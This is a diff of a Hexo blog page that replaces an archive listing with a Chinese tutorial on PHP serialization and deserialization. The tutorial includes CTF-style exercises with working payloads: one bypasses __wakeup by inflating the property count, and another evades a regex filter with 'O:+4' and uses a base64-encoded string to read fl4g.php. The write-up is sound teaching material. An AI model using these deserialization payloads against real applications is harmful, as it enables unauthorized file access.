@@ -6,17 +6,23 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives: 2022 | Hexo</title>
+  <title>Hexo</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta property="og:type" content="website">
+  <meta name="description" content="序列化与反序列化在PHP中，序列化用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。 所有序列化对于不同类型得到的字符串格式为：  String : s:size:value;  Integer : i:value;  Boolean : b:value;(保存1或0)  Null : N;  Array : a:size:{key definition;value definitio">
+<meta property="og:type" content="article">
 <meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/archives/2022/index.html">
+<meta property="og:url" content="http://example.com/2022/02/23/%E6%88%91%E7%9A%84%E6%96%87%E7%AB%A0/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="序列化与反序列化在PHP中，序列化用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。 所有序列化对于不同类型得到的字符串格式为：  String : s:size:value;  Integer : i:value;  Boolean : b:value;(保存1或0)  Null : N;  Array : a:size:{key definition;value definitio">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="c:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20211201194244242.png">
+<meta property="article:published_time" content="2022-02-23T11:22:10.784Z">
+<meta property="article:modified_time" content="2021-12-03T01:22:56.000Z">
 <meta property="article:author" content="Whirlpool">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20211201194244242.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -207,238 +213,232 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-我的文章/序列化与反序列化" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+  <div class="article-entry" itemprop="articleBody">
     
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2022" class="archive-year">2022</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2022/03/16/%E6%88%91%E7%9A%84%E6%96%87%E7%AB%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/" class="archive-article-date">
-        <time datetime="2022-03-16T04:49:01.216Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-16</time>
-</a>
+    <h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><p>在PHP中，序列化用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。</p>
+<p>所有序列化对于不同类型得到的字符串格式为：</p>
+<ul>
+<li><p><code>String</code> : s:size:value;</p>
+</li>
+<li><p><code>Integer</code> : i:value;</p>
+</li>
+<li><p><code>Boolean</code> : b:value;(保存1或0)</p>
+</li>
+<li><p><code>Null</code> : N;</p>
+</li>
+<li><p><code>Array</code> : a:size:{key definition;value definition;(repeated per element)}</p>
+</li>
+<li><p><code>Object</code> : O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}</p>
+</li>
+</ul>
+<h3 id="两个函数"><a href="#两个函数" class="headerlink" title="两个函数"></a>两个函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">serialize()     //将一个对象转换成一个字符串</span><br><span class="line">unserialize()   //将字符串还原成一个对象</span><br></pre></td></tr></table></figure>
 
-        </div>
-    	 
+<p>通过序列化与反序列化我们可以很方便的在php中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造payload攻击。</p>
+<p>在利用对php反序列化进行利用时，经常需要通过反序列化中的魔术方法，检查方法里有无敏感操作来进行利用。</p>
+<h3 id="常见方法"><a href="#常见方法" class="headerlink" title="常见方法"></a>常见方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__construct()//创建对象时触发</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__invoke() //当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>
 
-        <div class="article-info info-on-right">
+<h3 id="比较重要的方法"><a href="#比较重要的方法" class="headerlink" title="比较重要的方法"></a>比较重要的方法</h3><h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h4><blockquote>
+<p>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</p>
+</blockquote>
+<p>对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。</p>
+<h4 id="wakeup"><a href="#wakeup" class="headerlink" title="wakeup()"></a><strong>wakeup()</strong></h4><p>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</p>
+<p>绕过：<strong>wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行</strong></p>
+<p>例题：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class xctf&#123;</span><br><span class="line">public $flag = &#x27;111&#x27;;</span><br><span class="line">public function __wakeup()&#123;</span><br><span class="line">exit(&#x27;bad requests&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="C:\Users\86152\AppData\Roaming\Typora\typora-user-images\image-20211201194244242.png" alt="image-20211201194244242"></p>
+<p>接下来再来一道难度三颗星的例题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class Demo &#123; </span><br><span class="line">    private $file = &#x27;index.php&#x27;;</span><br><span class="line">    public function __construct($file) &#123; </span><br><span class="line">        $this-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct() &#123; </span><br><span class="line">        echo @highlight_file($this-&gt;file, true); </span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup() &#123; </span><br><span class="line">        if ($this-&gt;file != &#x27;index.php&#x27;) &#123; </span><br><span class="line">            //the secret is in the fl4g.php</span><br><span class="line">            $this-&gt;file = &#x27;index.php&#x27;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#x27;var&#x27;])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[&#x27;var&#x27;]); </span><br><span class="line">    if (preg_match(&#x27;/[oc]:\d+:/i&#x27;, $var)) &#123; </span><br><span class="line">        die(&#x27;stop hacking!&#x27;); </span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; else &#123; </span><br><span class="line">    highlight_file(&quot;index.php&quot;); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在 Demo 对象中有个 file 字段，根据默认值存储的应该是某个 PHP 文件名</p>
+<p>根据提示 flag 在文件fl4g.php中，因此我们先构造出 file 值为fl4g.php的 Demo 对象。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copy O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下来观察到有个preg_match() 函数进行正则匹配,<strong>“&#x2F;[oc]:\d+:&#x2F;i” 正则匹配的字符串，是在不区分大小写的情况下匹配 “o:数字” 或者 “c:数字’ 的字符串</strong></p>
+<p>绕过的方式是使用<strong>4 的同义表示方法 +4</strong></p>
+<p>同时还需要绕过 wakeup() 函数</p>
+<p>修改后的字符串如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copy O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后注意到还有个 base64_decode() 函数进行 base64 解码</p>
+<p>故最后的payload为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var=TzorNDoiRGVtbyI6Mjp7czoxMDoiRGVtb2ZpbGUiO3M6ODoiZmw0Zy5waHAiO30=</span><br></pre></td></tr></table></figure>
+
+
+    
+
+    
+    <div class="page-reward">
+      <a href="javascript:void(0);" class="page-reward-btn tooltip-top" target="_self">
+        <div class="tooltip tooltip-east">
+          <span class="tooltip-item">
+            赏
+          </span>
+          <span class="tooltip-content">
+            <span class="tooltip-text">
+              <span class="tooltip-inner">
+                <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i
+                    class="icon icon-quo-right"></i></p>
+                <div class="reward-box">
+                  
+                  <div class="reward-box-item">
+                    <img class="reward-img" src="/img/alipay.jpg">
+                    <span class="reward-type">支付宝</span>
+                  </div>
+                  
+                  
+                  <div class="reward-box-item">
+                    <img class="reward-img" src="/img/weixin.png">
+                    <span class="reward-type">微信</span>
+                  </div>
+                  
+                </div>
+              </span>
+            </span>
+          </span>
+        </div>
+      </a>
+    </div>
+    
+
+    
+    <div class="declare"> 
+      <ul class="post-copyright">
+        <li>
+          <strong>本文作者：</strong>
+          Whirlpool
+        </li>
+        <li>
+          <strong>本文链接：</strong>
+          <a href="http://example.com/2022/02/23/我的文章/序列化与反序列化/" title="" target="_blank">http://example.com/2022/02/23/我的文章/序列化与反序列化/</a>
+        </li>
+        
+        <li>
+          <strong>版权声明： </strong>
           
-          
+          本博客所有文章除特别声明外，均采用 <a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/blob/master/LICENSE" rel="external nofollow" target="_blank">MIT</a> 许可协议。转载请注明出处！
+        </li>
+        
+      </ul>
+    </div>
+    
 
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+
+    
+    
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <!-- <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a> -->
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/02/23/%E6%88%91%E7%9A%84%E6%96%87%E7%AB%A0/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" alt="微信分享二维码"> -->
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+
+    
+    <div class="clearfix"></div>
+  </div>
   </div>
 </article>
+
+
+<nav id="article-nav">
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2022/03/16/%E6%88%91%E7%9A%84%E6%96%87%E7%AB%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-        <time datetime="2022-03-16T04:38:44.279Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-16</time>
-</a>
-
-        </div>
-    	 
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2022/03/07/%E6%88%91%E7%9A%84%E6%96%87%E7%AB%A0/xss%E9%9D%B6%E5%9C%BA/" class="archive-article-date">
-        <time datetime="2022-03-07T12:03:58.773Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-07</time>
-</a>
-
-        </div>
-    	 
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2022/03/01/%E6%88%91%E7%9A%84%E6%96%87%E7%AB%A0/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/" class="archive-article-date">
-        <time datetime="2022-03-01T14:45:59.975Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-01</time>
-</a>
-
-        </div>
-    	 
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2022/02/27/%E6%88%91%E7%9A%84%E6%96%87%E7%AB%A0/sql%E5%9F%BA%E7%A1%80/" class="archive-article-date">
-        <time datetime="2022-02-27T08:24:39.300Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-27</time>
-</a>
-
-        </div>
-    	 
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2022/02/27/%E6%88%91%E7%9A%84%E6%96%87%E7%AB%A0/sqlmap%E5%9F%BA%E7%A1%80/" class="archive-article-date">
-        <time datetime="2022-02-27T07:38:59.257Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-27</time>
-</a>
-
-        </div>
-    	 
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2022/02/24/%E6%88%91%E7%9A%84%E6%96%87%E7%AB%A0/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D/" class="archive-article-date">
-        <time datetime="2022-02-24T13:26:43.181Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-24</time>
-</a>
-
-        </div>
-    	 
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2022/02/23/%E6%88%91%E7%9A%84%E6%96%87%E7%AB%A0/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" class="archive-article-date">
-        <time datetime="2022-02-23T14:45:47.039Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-23</time>
-</a>
-
-        </div>
-    	 
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2022/02/23/%E6%88%91%E7%9A%84%E6%96%87%E7%AB%A0/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="archive-article-date">
-        <time datetime="2022-02-23T11:22:10.784Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-23</time>
-</a>
-
-        </div>
-    	 
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+    <a href="/2022/02/23/%E6%88%91%E7%9A%84%E6%96%87%E7%AB%A0/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
   
   
-    </div></section>
-  
+</nav>
 
-    
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+
+
+
+
+
+
+
+
 
 
           </div>
@@ -479,8 +479,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: true,
